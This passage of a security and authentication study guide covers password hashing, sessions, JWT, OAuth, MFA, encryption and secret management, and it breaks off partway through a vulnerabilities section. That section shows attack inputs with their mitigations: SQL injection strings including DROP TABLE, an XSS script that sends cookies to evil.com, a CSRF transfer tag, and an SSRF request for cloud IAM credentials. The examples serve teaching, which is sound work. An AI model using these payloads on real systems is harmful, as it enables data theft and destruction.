# 13. Security and Authentication

## Table of Contents
1. [Authentication vs Authorization](#1-authentication-vs-authorization)
2. [Password Storage](#2-password-storage)
3. [Session Management](#3-session-management)
4. [JWT Deep Dive](#4-jwt-deep-dive)
5. [OAuth 2.0 Flows](#5-oauth-20-flows)
6. [OpenID Connect (OIDC)](#6-openid-connect-oidc)
7. [Single Sign-On (SSO)](#7-single-sign-on-sso)
8. [Multi-Factor Authentication (MFA)](#8-multi-factor-authentication-mfa)
9. [API Security](#9-api-security)
10. [Zero Trust Architecture](#10-zero-trust-architecture)
11. [RBAC vs ABAC vs PBAC](#11-rbac-vs-abac-vs-pbac)
12. [Encryption at Rest](#12-encryption-at-rest)
13. [Encryption in Transit](#13-encryption-in-transit)
14. [Secret Management](#14-secret-management)
15. [Common Vulnerabilities](#15-common-vulnerabilities)
16. [DDoS Protection](#16-ddos-protection)
17. [Input Validation and Injection Prevention](#17-input-validation-and-injection-prevention)
18. [Audit Logging](#18-audit-logging)
19. [Threat Modeling: STRIDE](#19-threat-modeling-stride)
20. [Compliance Frameworks](#20-compliance-frameworks)
21. [Quick Reference](#21-quick-reference)

---

## 1. Authentication vs Authorization

### Definitions

**Authentication (AuthN)**: Verifying the identity of a user or system. Answers: "Who are you?"
- Proving you are who you claim to be
- Examples: username/password, biometrics, hardware token

**Authorization (AuthZ)**: Determining what an authenticated identity is allowed to do. Answers: "What can you do?"
- Granting or denying access to resources/actions
- Examples: RBAC policies, ACLs, permission scopes

### Key Distinction

```
User → [Authentication] → Verified Identity → [Authorization] → Access Granted/Denied
         "Are you Alice?"                        "Can Alice read /admin?"
```

### Examples Side-by-Side

| Scenario | Authentication | Authorization |
|---|---|---|
| Login page | Verifying password hash match | Checking if user has `admin` role |
| API call | Validating JWT signature | Validating JWT scope includes `read:orders` |
| SSH access | Public key verification | Checking `authorized_keys` file |
| Database | Username/password to connect | GRANT SELECT ON table TO user |
| Door badge | Badge RFID scan | Door programmed to allow that badge |

### Authentication Factors
- **Something you know**: password, PIN, security question
- **Something you have**: hardware token, phone (SMS OTP), smart card
- **Something you are**: fingerprint, face recognition, iris scan
- **Somewhere you are**: IP geolocation, GPS coordinates
- **Something you do**: typing pattern, mouse movement (behavioral biometrics)

---

## 2. Password Storage

### The Golden Rule
**Never store plaintext passwords.** Never use fast hashing algorithms (MD5, SHA-1, SHA-256) directly — they are designed for speed, making brute-force attacks trivially fast.

### Why MD5/SHA-1 Are Dangerous

```
MD5 can compute ~10 billion hashes/second on modern GPUs
A GPU cluster can crack an MD5 hash in seconds
Rainbow tables exist for common MD5 and SHA-1 hashes
```

### Salting

A **salt** is a random unique value added to each password before hashing.

```python
# Without salt — same passwords produce same hash
hash("password123") == hash("password123")  # TRUE — vulnerable to rainbow tables

# With salt — same passwords produce different hashes
hash("password123" + "a3f8b2c1") != hash("password123" + "9d2e4f7a")  # Different salts
```

Salts must be:
- Unique per user (not a global salt)
- Randomly generated (at least 128 bits)
- Stored alongside the hash (not secret)
- The purpose is defeating precomputed rainbow tables, not adding secrecy

### Recommended Algorithms

#### bcrypt
```python
import bcrypt

# Hashing
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)  # cost factor 12 = 2^12 iterations
hashed = bcrypt.hashpw(password, salt)

# Verification
bcrypt.checkpw(b"user_password", hashed)  # True

# Cost factor recommendation: 10-14 (tune so hashing takes ~100ms-300ms)
```

**Properties**:
- Built-in salt generation
- Adaptive cost factor (increase as hardware speeds up)
- Max 72-byte input limit (hash longer passwords with SHA-256 first)
- Output format: `$2b$12$<22-char-salt><31-char-hash>`

#### scrypt
```python
import hashlib, os

salt = os.urandom(32)
key = hashlib.scrypt(
    b"user_password",
    salt=salt,
    n=16384,   # CPU/memory cost (must be power of 2)
    r=8,       # block size
    p=1,       # parallelization
    dklen=64   # output length
)
```

**Properties**:
- Memory-hard (harder to parallelize on GPUs/ASICs)
- Parameters: N (CPU+memory cost), r (memory per thread), p (parallelism)
- Recommended when GPU resistance is critical

#### Argon2 (Current Best Practice)
```python
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,       # number of iterations
    memory_cost=65536, # 64 MB of RAM
    parallelism=4,     # threads
    hash_len=32,
    salt_len=16
)

hash = ph.hash("user_password")
ph.verify(hash, "user_password")  # True
```

**Properties**:
- Winner of Password Hashing Competition (2015)
- Three variants: Argon2d (GPU resistance), Argon2i (side-channel resistance), Argon2id (recommended, hybrid)
- Tunable time, memory, and parallelism costs
- OWASP recommended default

### Algorithm Comparison

| Algorithm | Memory Hard | GPU Resistant | Max Input | OWASP Recommended |
|---|---|---|---|---|
| MD5 | No | No | Unlimited | Never |
| SHA-256 | No | No | Unlimited | Never (for passwords) |
| bcrypt | No | Partial | 72 bytes | Yes (acceptable) |
| scrypt | Yes | Yes | Unlimited | Yes |
| Argon2id | Yes | Yes | Unlimited | Yes (preferred) |

### Migration Strategy
When upgrading from MD5/SHA-1 to bcrypt/Argon2:
1. Add a new column for the new hash
2. On next login: verify old hash, rehash with new algorithm, store new hash, null out old hash
3. After N days, force password reset for accounts with old hashes still populated
4. Never do a bulk re-hash without the original password

---

## 3. Session Management

### Server-Side Sessions

```
Client                    Server                    Redis
  |                          |                        |
  |-- POST /login ---------> |                        |
  |                          |-- SET session:abc123 ->|
  |<-- Set-Cookie: sid=abc123|                        |
  |                          |                        |
  |-- GET /dashboard ------> |                        |
  |   Cookie: sid=abc123     |-- GET session:abc123 ->|
  |                          |<-- {user_id: 42} ------|
  |<-- 200 OK --------------|                        |
```

**Session Cookie Properties**:
```http
Set-Cookie: sessionId=abc123xyz;
  HttpOnly;          # Cannot be accessed by JavaScript (XSS protection)
  Secure;            # Only sent over HTTPS
  SameSite=Strict;   # Not sent on cross-site requests (CSRF protection)
  Path=/;
  Max-Age=86400;     # 1 day
  Domain=example.com
```

**Redis session store schema**:
```json
{
  "session:abc123xyz": {
    "user_id": 42,
    "email": "alice@example.com",
    "roles": ["user", "editor"],
    "created_at": 1700000000,
    "last_active": 1700003600,
    "ip_address": "1.2.3.4",
    "user_agent": "Mozilla/5.0..."
  }
}
```

**Session fixation prevention**: Always regenerate session ID after login.

### Stateless Sessions (JWT)

```
Client                    Server
  |                          |
  |-- POST /login ---------> |
  |<-- {access_token: jwt} --|
  |                          |
  |-- GET /dashboard ------> |
  |   Authorization: Bearer jwt
  |                          | (validates signature locally, no DB lookup)
  |<-- 200 OK --------------|
```

### Server-Side vs JWT Comparison

| Aspect | Server-Side Sessions | JWT (Stateless) |
|---|---|---|
| Storage | Server (Redis/DB) | Client-side |
| Revocation | Immediate (delete from store) | Hard — must wait for expiry |
| Horizontal scaling | Needs shared session store | No shared state needed |
| Payload size | Cookie is small (just an ID) | Token carries full claims (larger) |
| Server state | Stateful | Stateless |
| Invalidation on logout | Yes, immediate | Not immediate |
| Good for | Traditional web apps, sensitive access | APIs, microservices, SPAs |

---

## 4. JWT Deep Dive

### Structure

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNzAwMDAwMDAwfQ
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
   [Header]                                    [Payload]                                                        [Signature]
```

### Header
```json
{
  "alg": "RS256",   // Algorithm: HS256 (HMAC), RS256 (RSA), ES256 (ECDSA)
  "typ": "JWT"
}
```

**Algorithm choices**:
- `HS256`: Symmetric — same secret for sign and verify. Simple but secret must be shared.
- `RS256`: Asymmetric — private key signs, public key verifies. Better for distributed systems.
- `ES256`: Elliptic curve — smaller keys, same security as RS256. Preferred for mobile.
- Never accept `alg: none` — this is a known attack vector.

### Payload (Claims)

```json
{
  // Registered claims (standardized)
  "iss": "https://auth.example.com",     // Issuer
  "sub": "user:42",                       // Subject (user ID)
  "aud": "https://api.example.com",       // Audience
  "exp": 1700003600,                      // Expiration (Unix timestamp)
  "iat": 1700000000,                      // Issued At
  "nbf": 1700000000,                      // Not Before
  "jti": "unique-token-id",              // JWT ID (for revocation tracking)

  // Custom claims
  "email": "alice@example.com",
  "roles": ["user", "editor"],
  "scope": "read:orders write:orders"
}
```

**Important**: JWT payload is Base64URL encoded, NOT encrypted. Anyone can decode it. Never store sensitive data (passwords, PII, secrets) in JWT payload unless using JWE (JSON Web Encryption).

### Signature

```
HMACSHA256(
  base64url(header) + "." + base64url(payload),
  secret_key
)
```

### Access Token vs Refresh Token

```
Short-lived access token (15 min - 1 hour):
  - Sent with every API request
  - Small exposure window if leaked
  - No server-side state needed

Long-lived refresh token (7 days - 90 days):
  - Stored securely (HttpOnly cookie or secure storage)
  - Used ONLY to obtain new access tokens
  - Should be stored server-side for revocation capability
  - Rotate on each use (refresh token rotation)
```

**Token refresh flow**:
```
Client                         Auth Server                    API Server
  |                                |                               |
  |-- API call with access token ->|------------------------------> |
  |<-- 401 Token Expired ----------|<------------------------------ |
  |                                |                               |
  |-- POST /token/refresh -------> |                               |
  |   Body: {refresh_token: "..."}  |                               |
  |<-- {access_token: new_jwt} ----|                               |
  |                                |                               |
  |-- API call with new token ---> |------------------------------> |
```

### JWT Security Best Practices

1. Always validate `exp`, `iss`, `aud` claims
2. Use short expiry for access tokens (15-60 minutes)
3. Implement refresh token rotation
4. Store refresh tokens in HttpOnly cookies, not localStorage
5. Use RS256/ES256 over HS256 for multi-service environments
6. Maintain a token blocklist (using `jti`) for critical revocations
7. Never put sensitive data in payload
8. Validate algorithm in header matches expected algorithm

---

## 5. OAuth 2.0 Flows

OAuth 2.0 is an authorization framework. It grants third-party applications limited access to resources without exposing credentials.

### Core Roles
- **Resource Owner**: The user
- **Client**: The application requesting access
- **Authorization Server**: Issues tokens (e.g., Auth0, Okta, Google)
- **Resource Server**: API that hosts the protected resources

### Flow 1: Authorization Code (Recommended for Web Apps)

```
User → Client App → Authorization Server → User Approves → Authorization Code
     → Client exchanges code for token → Access Token + Refresh Token
```

```
1. Client redirects user:
   GET https://auth.example.com/authorize
     ?response_type=code
     &client_id=CLIENT_ID
     &redirect_uri=https://app.example.com/callback
     &scope=read:profile read:orders
     &state=random_csrf_token

2. User authenticates and approves

3. Auth server redirects back:
   GET https://app.example.com/callback
     ?code=AUTHORIZATION_CODE
     &state=random_csrf_token

4. Client exchanges code for tokens (server-to-server):
   POST https://auth.example.com/token
   Body: {
     grant_type: "authorization_code",
     code: "AUTHORIZATION_CODE",
     redirect_uri: "https://app.example.com/callback",
     client_id: CLIENT_ID,
     client_secret: CLIENT_SECRET
   }

5. Auth server returns:
   {
     "access_token": "eyJ...",
     "refresh_token": "def50200...",
     "token_type": "Bearer",
     "expires_in": 3600
   }
```

### Authorization Code with PKCE (For SPAs and Mobile Apps)

PKCE (Proof Key for Code Exchange) prevents authorization code interception attacks when client secret cannot be kept confidential.

```python
import secrets, hashlib, base64

# Step 1: Generate code verifier and challenge
code_verifier = secrets.token_urlsafe(64)  # Random 64-byte string
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).rstrip(b'=').decode()

# Step 2: Include challenge in authorization request
# GET /authorize?...&code_challenge=CODE_CHALLENGE&code_challenge_method=S256

# Step 3: Include verifier in token exchange
# POST /token body: {..., code_verifier: CODE_VERIFIER}
# Server verifies: SHA256(code_verifier) == code_challenge
```

### Flow 2: Client Credentials (Machine-to-Machine)

```
POST /token
{
  "grant_type": "client_credentials",
  "client_id": "service-a",
  "client_secret": "secret",
  "scope": "read:data"
}
```

Used for: microservice-to-microservice communication, scheduled jobs, backend daemons. No user involved.

### Flow 3: Device Code (TV/CLI/IoT)

```
1. Device: POST /device/code → {device_code, user_code, verification_uri}
2. Device shows: "Visit https://example.com/activate and enter code: ABCD-1234"
3. User: visits URL on phone/laptop, enters code, approves
4. Device: polls POST /token with device_code until approved
5. Device: receives access token
```

### Flow 4: Implicit (Deprecated)

Tokens returned directly in URL fragment. Deprecated because:
- Tokens appear in browser history and server logs
- No refresh tokens
- Replaced by Authorization Code + PKCE

### OAuth 2.0 Flow Decision Matrix

| Use Case | Flow |
|---|---|
| Web app with backend | Authorization Code |
| SPA / Mobile app | Authorization Code + PKCE |
| Machine-to-machine | Client Credentials |
| Smart TV / CLI | Device Code |
| Legacy (avoid) | Implicit |

---

## 6. OpenID Connect (OIDC)

OIDC is an identity layer built on top of OAuth 2.0. While OAuth 2.0 handles authorization, OIDC handles authentication — it tells you who the user is.

### Key Addition: ID Token

```json
// ID Token (additional JWT returned alongside access token)
{
  "iss": "https://accounts.google.com",
  "sub": "110169484474386276334",  // Stable user identifier
  "aud": "your-client-id",
  "exp": 1700003600,
  "iat": 1700000000,
  "email": "alice@gmail.com",
  "email_verified": true,
  "name": "Alice Smith",
  "picture": "https://...",
  "locale": "en"
}
```

### OIDC Endpoints

```
/.well-known/openid-configuration  → Discovery document
/authorize                         → Authorization endpoint
/token                             → Token endpoint
/userinfo                          → UserInfo endpoint (protected, requires access token)
/jwks.json                         → JSON Web Key Set (public keys for token validation)
/endsession                        → Logout endpoint
```

### OIDC Scopes

```
scope=openid                        → Required; returns sub claim
scope=openid profile                → Returns name, picture, locale
scope=openid email                  → Returns email, email_verified
scope=openid phone                  → Returns phone_number
scope=openid address                → Returns address
```

### OAuth 2.0 vs OIDC

| Aspect | OAuth 2.0 | OIDC |
|---|---|---|
| Purpose | Authorization (what can app do?) | Authentication (who is the user?) |
| Token | Access Token (opaque or JWT) | ID Token (always JWT) + Access Token |
| User info | Not specified | Standard UserInfo endpoint |
| Scope | Custom scopes | `openid` required + standard scopes |
| Use case | API access delegation | Login with Google/Facebook/etc. |

---

## 7. Single Sign-On (SSO)

### How SSO Works

```
User                    App A           Identity Provider (IdP)      App B
  |                       |                     |                      |
  |-- access App A -----> |                     |                      |
  |<-- redirect to IdP ---|                     |                      |
  |                                             |                      |
  |-- authenticate --------------------------> |                      |
  |<-- SSO session + token -------------------|                      |
  |                                             |                      |
  |-- redirect to App A with token ----------> |                      |
  |<-- access granted (App A session) --------|                      |
  |                                             |                      |
  |-- access App B -----------------------------------------> |      |
  |<-- redirect to IdP ----------------------------------------|      |
  |-- IdP sees SSO session (no re-auth needed) -------------> |      |
  |<-- token for App B ----------------------------------------|      |
  |<-- access granted (App B session) ----------------------- |      |
```

### SAML 2.0

XML-based federation protocol, common in enterprise environments.

**Roles**:
- **Service Provider (SP)**: The application (e.g., Salesforce)
- **Identity Provider (IdP)**: The authentication authority (e.g., Okta, ADFS)

**SAML Assertion**:
```xml
<saml:Assertion>
  <saml:Issuer>https://idp.company.com</saml:Issuer>
  <saml:Subject>
    <saml:NameID>alice@company.com</saml:NameID>
  </saml:Subject>
  <saml:AttributeStatement>
    <saml:Attribute Name="groups">
      <saml:AttributeValue>admins</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
  <saml:Conditions NotBefore="..." NotOnOrAfter="..."/>
</saml:Assertion>
```

### SAML 2.0 vs OIDC

| Aspect | SAML 2.0 | OIDC |
|---|---|---|
| Format | XML | JSON/JWT |
| Transport | HTTP redirect/POST | HTTP redirect + JSON API |
| Use case | Enterprise, legacy | Modern web/mobile apps |
| Complexity | High (XML parsing, signatures) | Lower |
| Mobile friendly | No (XML over redirect) | Yes |
| Provider support | Okta, ADFS, Azure AD | Google, Auth0, Okta, Cognito |
| SSO logout | Supported (SP-initiated, IdP-initiated) | Supported (less standardized) |

### Federation

```
Company A's Users ──────────────────────────────── Company B's App
                     Trust relationship
                     (metadata exchange)
                     IdP A federates with SP B
```

Cross-organization trust is established by exchanging metadata (certificates, endpoints).

---

## 8. Multi-Factor Authentication (MFA)

### TOTP (Time-based One-Time Password)

```python
import pyotp, time

# Setup (shared secret stored server-side, QR code shown to user once)
secret = pyotp.random_base32()  # e.g., "JBSWY3DPEHPK3PXP"

# Generating OTP (also runs on authenticator app using same secret + current time)
totp = pyotp.TOTP(secret)
current_otp = totp.now()  # 6-digit code, valid for 30 seconds

# Verification
totp.verify("123456")  # True/False
totp.verify("123456", valid_window=1)  # Allow 1 period tolerance for clock skew
```

**How it works**: `TOTP = HOTP(secret, floor(current_time / 30))`

Apps: Google Authenticator, Authy, Microsoft Authenticator.

### SMS OTP

- Simpler UX but less secure
- Vulnerable to SIM swapping attacks
- SS7 protocol interception
- Acceptable for consumer apps, not for high-security

**SIM Swap Attack**: Attacker social engineers carrier to transfer victim's number → receives victim's SMS OTPs.

### WebAuthn / FIDO2

The strongest form of MFA. Uses public-key cryptography.

```
Registration:
1. Server sends challenge
2. Authenticator (hardware key / biometric) generates key pair
3. Public key stored on server, private key stays on device
4. Credential signed with private key

Authentication:
1. Server sends challenge
2. User authenticates locally (PIN, biometric, touch)
3. Authenticator signs challenge with private key
4. Server verifies with stored public key
```

**Benefits**:
- Phishing-resistant (credential is bound to origin)
- No shared secrets
- Works with platform authenticators (Face ID, Windows Hello) or hardware keys (YubiKey)

### MFA Comparison

| Method | Security | UX | Phishing Resistant |
|---|---|---|---|
| SMS OTP | Low | Easy | No |
| TOTP | Medium | Moderate | No |
| Push notification | Medium | Easy | No |
| WebAuthn/FIDO2 | High | Easy (once enrolled) | Yes |
| Hardware key (FIDO2) | Very High | Moderate | Yes |

---

## 9. API Security

### API Keys

Simple shared secret included in request headers or query params.

```http
GET /api/data
X-API-Key: ak_live_abc123def456

# Or as query parameter (less secure — appears in logs)
GET /api/data?api_key=ak_live_abc123def456
```

**Best practices**:
- Prefix to identify type: `sk_live_`, `pk_test_`
- Store hashed in database (SHA-256 is fine here — API keys are long and random)
- Allow key rotation without downtime
- Scope keys to specific permissions
- Rate limit per key
- Log key usage for audit

### HMAC Signatures (Request Signing)

Used when you need to prove request integrity, not just identity.

```python
import hmac, hashlib, time

def sign_request(method, path, body, secret_key):
    timestamp = str(int(time.time()))
    content_hash = hashlib.sha256(body.encode()).hexdigest()
    
    # Canonical string to sign
    string_to_sign = f"{method}\n{path}\n{timestamp}\n{content_hash}"
    
    # HMAC-SHA256
    signature = hmac.new(
        secret_key.encode(),
        string_to_sign.encode(),
        hashlib.sha256
    ).hexdigest()
    
    return {
        "X-Timestamp": timestamp,
        "X-Signature": signature,
        "X-Content-Hash": content_hash
    }
```

**Replay attack prevention**: Include timestamp, reject requests older than 5 minutes. Include nonce for true uniqueness.

### Certificate-Based Authentication (mTLS)

Both client and server present certificates. Covered in more detail in [Section 13](#13-encryption-in-transit).

### AWS SigV4

AWS's request signing protocol:

```
1. Create canonical request (method, URI, headers, body hash)
2. Create string to sign (algorithm, date, credential scope, canonical request hash)
3. Calculate signing key (HMAC chain using secret + date + region + service)
4. Add signature to Authorization header
```

---

## 10. Zero Trust Architecture

### Core Principle

"Never trust, always verify" — no implicit trust based on network location.

Traditional model: "Trust inside the perimeter, verify outside."
Zero Trust model: "Verify every request, regardless of source."

### BeyondCorp (Google's Implementation)

```
Traditional VPN Model:
  Internet → VPN → [Trusted Internal Network] → Apps

BeyondCorp Model:
  Internet → [Identity-Aware Proxy] → App
                    |
              Device Trust +
              User Identity +
              Context (time, location, risk score)
```

### Zero Trust Pillars

1. **Identity**: Strong authentication (MFA), continuous verification
2. **Device**: Device health checks, MDM enrollment, certificate
3. **Network**: Microsegmentation, encrypted channels
4. **Application**: Fine-grained access control, no implicit trust
5. **Data**: Classification, encryption, DLP
6. **Monitoring**: Continuous logging, behavior analytics

### Microsegmentation

```
Traditional: All services in same VPC can talk to each other

Microsegmented:
  Service A → [Policy Engine] → Service B (allowed)
  Service A → [Policy Engine] → Service C (denied — different segment)
  
Each service only communicates with explicitly permitted peers.
Network policies enforced by:
  - Kubernetes NetworkPolicy
  - Service mesh (Istio, Linkerd)
  - Cloud security groups (fine-grained)
```

### Zero Trust Implementation Checklist

- [ ] All access through identity-aware proxy or API gateway
- [ ] MFA enforced for all users
- [ ] Device health checked before granting access
- [ ] Principle of least privilege for all service accounts
- [ ] Network traffic encrypted end-to-end (mTLS)
- [ ] Continuous monitoring and anomaly detection
- [ ] Regular access reviews and certification campaigns

---

## 11. RBAC vs ABAC vs PBAC

### RBAC (Role-Based Access Control)

Access based on user roles.

```json
// Role definitions
{
  "roles": {
    "viewer": ["read:articles"],
    "editor": ["read:articles", "write:articles"],
    "admin":  ["read:articles", "write:articles", "delete:articles", "manage:users"]
  }
}

// User assignment
{
  "user_id": 42,
  "roles": ["editor"]
}
```

**Pros**: Simple, easy to audit, well-understood
**Cons**: Role explosion (hundreds of roles), coarse-grained, hard to express context

### ABAC (Attribute-Based Access Control)

Access based on attributes of subject, resource, and environment.

```
Policy: ALLOW if
  subject.department == resource.department AND
  action == "read" AND
  environment.time >= "09:00" AND
  environment.time <= "18:00"

Example:
  User(dept=Finance) can READ Document(dept=Finance) during business hours
  User(dept=Engineering) CANNOT READ Document(dept=Finance)
```

**Pros**: Very fine-grained, contextual, handles complex policies
**Cons**: Complex to implement and reason about, performance overhead

### PBAC (Policy-Based Access Control)

Explicit policies written in a policy language (e.g., OPA/Rego, Cedar, AWS IAM).

```rego
# OPA (Open Policy Agent) Rego example
package authz

allow {
  input.method == "GET"
  input.path[0] == "articles"
  has_role(input.user, "viewer")
}

allow {
  input.method == "POST"
  input.path[0] == "articles"
  has_role(input.user, "editor")
  input.user.subscription == "premium"
}

has_role(user, role) {
  user.roles[_] == role
}
```

### Comparison

| Aspect | RBAC | ABAC | PBAC |
|---|---|---|---|
| Granularity | Coarse | Fine | Very fine |
| Complexity | Low | High | Medium-High |
| Flexibility | Low | High | High |
| Performance | Fast | Slower (policy eval) | Depends on engine |
| Auditability | Easy | Harder | Good (policies as code) |
| Best for | Simple apps, enterprises | Complex multi-tenant, IoT | Cloud-native, microservices |
| Examples | AWS IAM Roles, Active Directory | XACML, AWS resource tags | OPA, Cedar, AWS IAM policies |

---

## 12. Encryption at Rest

### AES-256

Advanced Encryption Standard with 256-bit key. Current gold standard for symmetric encryption.

```
Plaintext + Key → AES-256-GCM → Ciphertext + Authentication Tag

Modes:
  AES-CBC: Cipher Block Chaining (requires padding, no auth)
  AES-GCM: Galois/Counter Mode (authenticated, preferred — provides integrity)
  AES-CTR: Counter mode (stream cipher, no padding)
```

Always use **AES-256-GCM** for new systems — it provides both confidentiality and integrity.

### Key Management

**Key Hierarchy**:
```
Master Key (Hardware Security Module / CloudHSM)
    └── Data Encryption Keys (DEKs)
            └── Encrypted Data
```

This is called **envelope encryption**:
1. Generate a Data Encryption Key (DEK) for each object/record
2. Encrypt data with DEK
3. Encrypt DEK with Key Encryption Key (KEK) from KMS
4. Store: `{encrypted_data, encrypted_DEK}`
5. To decrypt: decrypt DEK with KMS, then decrypt data with DEK

### AWS KMS

```python
import boto3

kms = boto3.client('kms', region_name='us-east-1')

# Encrypt
response = kms.encrypt(
    KeyId='arn:aws:kms:us-east-1:123456789:key/...',
    Plaintext=b'sensitive data'
)
ciphertext = response['CiphertextBlob']

# Decrypt (KMS verifies caller has permission)
response = kms.decrypt(CiphertextBlob=ciphertext)
plaintext = response['Plaintext']

# Generate data key (envelope encryption)
response = kms.generate_data_key(
    KeyId='arn:aws:kms:...',
    KeySpec='AES_256'
)
plaintext_key = response['Plaintext']       # Use this, then discard from memory
encrypted_key = response['CiphertextBlob']  # Store alongside encrypted data
```

### HashiCorp Vault

```bash
# Enable transit engine (encryption as a service)
vault secrets enable transit
vault write -f transit/keys/my-key type=aes256-gcm96

# Encrypt
vault write transit/encrypt/my-key \
  plaintext=$(base64 <<< "sensitive data")

# Decrypt
vault write transit/decrypt/my-key \
  ciphertext="vault:v1:..."

# Key rotation (old ciphertexts still decrypt, new encrypts use new key version)
vault write -f transit/keys/my-key/rotate
vault write transit/rewrap/my-key ciphertext="vault:v1:..."  # Rewrap to new version
```

### Database Encryption

| Level | Method | Notes |
|---|---|---|
| Disk/Volume | Transparent Data Encryption (TDE) | OS-level, protects physical theft |
| Column | Application-level AES encryption | Fine-grained, search is harder |
| Row | AWS RDS encryption, PostgreSQL pgcrypto | Balance of protection and usability |
| Backup | Encrypted backups | Always encrypt backup files |

---

## 13. Encryption in Transit

### TLS 1.3

Latest TLS version with significant improvements:

```
TLS 1.3 Handshake (1-RTT):
Client                          Server
  |-- ClientHello + key_share ->|
  |   (supported cipher suites,  |
  |    key shares for key agmt)  |
  |                              |-- ServerHello + key_share
  |                              |   Certificate
  |                              |   CertificateVerify
  |<-- [Encrypted from here] ----|   Finished
  |-- Finished ----------------> |
  |== Application Data =========>|  (encrypted)
```

**TLS 1.3 improvements over 1.2**:
- 1-RTT handshake (vs 2-RTT in 1.2)
- 0-RTT resumption (with replay attack considerations)
- Removed weak cipher suites (RC4, MD5, SHA-1, DES)
- Forward secrecy mandatory (ECDHE only)
- Encrypted certificate in handshake (privacy improvement)

### Certificate Pinning

Hardcoding expected certificate or public key to prevent MITM attacks.

```java
// Android OkHttp certificate pinning
OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(new CertificatePinner.Builder()
        .add("api.example.com",
             "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")  // Public key hash
        .build())
    .build();
```

**When to use**: High-security mobile apps, IoT devices
**Risks**: Certificate rotation breaks pinned apps — need pinning with backup pins and graceful update mechanism

### mTLS (Mutual TLS)

Both client and server authenticate with certificates.

```
Normal TLS:  Client verifies Server's certificate
mTLS:        Client verifies Server's certificate AND
             Server verifies Client's certificate
```

```yaml
# Istio service mesh mTLS configuration
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT  # Reject plaintext, require mTLS for all service-to-service
```

**Use cases**: Service mesh (Kubernetes), internal microservice communication, B2B API access

---

## 14. Secret Management

### What Are Secrets?

- Database passwords and connection strings
- API keys for third-party services
- Encryption keys
- TLS private keys
- OAuth client secrets
- Service account credentials

### Anti-Patterns to Avoid

```bash
# NEVER: Secrets in code
DB_PASSWORD = "supersecret123"  # In source code

# NEVER: Secrets in environment variables (visible in process list, logs)
export DB_PASSWORD=supersecret123

# NEVER: Secrets in Docker Compose files
environment:
  - DB_PASSWORD=supersecret123

# NEVER: Secrets committed to git (even private repos)
# If it happened: rotate immediately, remove from git history
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch config/secrets.yml" HEAD
```

### HashiCorp Vault

```
Architecture:
  ┌─────────────────────────────────────┐
  │              Vault                   │
  │  ┌─────────┐  ┌──────────────────┐  │
  │  │ Auth    │  │  Secret Engines  │  │
  │  │ Methods │  │  - KV (v2)       │  │
  │  │ - Token │  │  - Database      │  │
  │  │ - AWS   │  │  - PKI           │  │
  │  │ - K8s   │  │  - Transit       │  │
  │  └─────────┘  └──────────────────┘  │
  │           ┌────────┐                │
  │           │Storage │                │
  │           │(etcd,  │                │
  │           │ Raft)  │                │
  │           └────────┘                │
  └─────────────────────────────────────┘
```

```bash
# Store a secret
vault kv put secret/myapp/db password="supersecret" username="admin"

# Read a secret
vault kv get secret/myapp/db
vault kv get -field=password secret/myapp/db

# Dynamic database credentials (auto-rotated)
vault write database/config/my-postgres \
  plugin_name=postgresql-database-plugin \
  connection_url="postgresql://vault:{{password}}@postgres:5432/mydb" \
  allowed_roles="my-role"

vault read database/creds/my-role  # Returns short-lived DB credentials
```

### AWS Secrets Manager

```python
import boto3, json

client = boto3.client('secretsmanager', region_name='us-east-1')

# Store secret
client.create_secret(
    Name='prod/myapp/database',
    SecretString=json.dumps({
        'username': 'admin',
        'password': 'supersecret',
        'host': 'db.example.com'
    })
)

# Retrieve secret
response = client.get_secret_value(SecretId='prod/myapp/database')
secret = json.loads(response['SecretString'])

# Automatic rotation (Lambda function rotates every 30 days)
client.rotate_secret(
    SecretId='prod/myapp/database',
    RotationLambdaARN='arn:aws:lambda:...',
    RotationRules={'AutomaticallyAfterDays': 30}
)
```

### Secret Rotation Strategies

1. **Scheduled rotation**: Rotate every N days regardless of exposure
2. **Event-driven rotation**: Rotate on employee offboarding, suspected breach
3. **Zero-downtime rotation**: 
   - Write new secret version
   - Deploy app version that reads both old and new
   - Update service to use new secret
   - Remove old secret

---

## 15. Common Vulnerabilities

### SQL Injection

**Attack**:
```sql
-- Input: " OR '1'='1
SELECT * FROM users WHERE username='' OR '1'='1' AND password=''
-- Returns all users!

-- Input: '; DROP TABLE users; --
SELECT * FROM users WHERE username=''; DROP TABLE users; --'
```

**Mitigation**:
```python
# WRONG - string concatenation
query = f"SELECT * FROM users WHERE username='{username}'"

# CORRECT - parameterized queries
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# ORM (Django)
User.objects.filter(username=username)  # Always safe
```

### XSS (Cross-Site Scripting)

**Attack**:
```html
<!-- Stored XSS: attacker saves this as a comment -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- Reflected XSS: malicious link sent to victim -->
https://example.com/search?q=<script>...</script>
```

**Mitigation**:
- Output encode all user-supplied data: `&lt;` instead of `<`
- Content Security Policy (CSP) header
- `HttpOnly` cookies prevent JavaScript access
- Framework auto-escaping (React JSX, Django templates)

### CSRF (Cross-Site Request Forgery)

**Attack**:
```html
<!-- Attacker's site tricks victim's browser into making authenticated request -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- Victim's browser sends their session cookie automatically! -->
```

**Mitigation**:
- `SameSite=Strict` cookie attribute
- CSRF tokens (synchronizer token pattern)
- Double-submit cookie pattern
- Check `Origin` and `Referer` headers

### SSRF (Server-Side Request Forgery)

**Attack**:
```
Attacker sends: POST /fetch-url
Body: {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
                     ↑ AWS metadata service — attacker gets IAM credentials!
```

**Mitigation**:
- Allowlist external URLs
